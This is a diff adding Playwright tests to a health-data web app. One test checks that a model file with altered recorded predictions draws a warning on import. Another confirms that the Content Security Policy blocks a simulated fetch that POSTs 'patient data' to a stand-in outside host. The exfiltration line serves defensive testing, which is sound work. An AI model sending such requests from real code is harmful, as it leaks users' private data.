@@ -102,6 +102,38 @@ test('settings and trained model can be saved and loaded again', async ({ page }
     await expect(page.locator('#step-5-content')).toBeVisible();
     await page.click('#run-single-predict-btn');
     await expect(page.locator('#single-result-banner .pred-outcome-val')).toBeVisible();
+    // Provenance and the reproducibility self-check recorded in the file and confirmed on import
+    expect(bundle.environment && bundle.environment.app).toBeTruthy();
+    expect(bundle.selfCheck.inputs.length).toBe(3);
+    const [cardDl] = await Promise.all([page.waitForEvent('download'), page.click('#model-card-btn')]);
+    expect(fs.readFileSync(await cardDl.path(), 'utf8')).toContain('reproducibility check on import: reproduced exactly');
+    // A file whose recorded predictions no longer match (altered parameters) is questioned before use
+    const tampered = JSON.parse(JSON.stringify(bundle));
+    tampered.selfCheck.outputs[0] = tampered.selfCheck.outputs[0].map((v, k) => (k ? Math.min(1, v + 0.2) : v));
+    const tamperedPath = modelPath + '.tampered.json';
+    fs.writeFileSync(tamperedPath, JSON.stringify(tampered));
+    const messages = [];
+    page.on('dialog', d => messages.push(d.message()));
+    await page.goto('/index.html');
+    await page.setInputFiles('#model-file-input', tamperedPath);
+    await expect.poll(() => messages.some(m => /Reproducibility check/.test(m))).toBe(true);
+    expect(errors).toEqual([]);
+});
+
+test('Content Security Policy: the page cannot send data to another server', async ({ page }) => {
+    const errors = watch(page);
+    await page.route('https://example.org/**', route => route.fulfill({ status: 200, body: 'reached' })); // never the real network
+    await page.goto('/index.html');
+    const result = await page.evaluate(async () => {
+        const violations = [];
+        document.addEventListener('securitypolicyviolation', e => violations.push(e.violatedDirective));
+        let sent = false;
+        try { await fetch('https://example.org/collect', { method: 'POST', body: 'patient data' }); sent = true; } catch (e) { sent = false; }
+        await new Promise(r => setTimeout(r, 200));
+        return { sent, violations };
+    });
+    expect(result.sent).toBe(false);
+    expect(result.violations.some(v => /connect-src/.test(v))).toBe(true);
     expect(errors).toEqual([]);
 });
 
